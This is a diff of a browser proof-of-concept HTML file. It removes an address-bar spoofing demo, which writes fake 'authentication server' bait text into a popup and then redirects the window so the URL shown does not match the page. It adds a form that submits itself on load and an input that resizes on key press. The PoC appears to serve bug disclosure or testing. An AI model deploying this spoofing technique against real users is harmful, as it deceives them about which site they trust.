@@ -1,33 +1,23 @@
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+<style>
 
-<button onclick=newWindow()>New Window</button>
-<button onclick=spoof()>Spoof</button>
-
+</style>
+<p id="fill"></p>
+<form id="form"   method="POST" action ="poc1.html?submit=1">
+    <input type="text" id="email" name="email">
+    <input type="submit" value="Submit">
+</form>
 <script>
-let w;
-let t;
-
-function newWindow() {
-  w = window.open("", "", "");
-  w.document.write(`<body onblur="document.body.innerHTML='<h2>Your address bar has been spoofed. This is not https://www.example.com</h2>'"><h2>There was a problem communicating with drive authentication server, please switch to previous tabs. Do not close this window, closing this window will cancel current download.</h2></body>`);
+if(window.location.search.substring(1)==""){
+    key = document.getElementById("email")
+    key.value = "aaaaaaaaaaaaaa";
+    $("#form").submit();
 }
-
-function spoof() {
-    w.location.href = 'https://www.example.com/';
-
-var i = setInterval(function () {
-  try {
-    w.location.href;
-  } catch (e) {
-    w.location.href = 'https://www.google.com:1212';
-
-    clearInterval(i);
-  }
-}, 1);
-
-
+//$("#form").submit();
+var key = document.getElementById("email");
+key.onkeydown = f 
+function f(e){
+    $('#email').attr('style', "height: "+document.body.offsetHeight+"px")
 }
 
 </script>
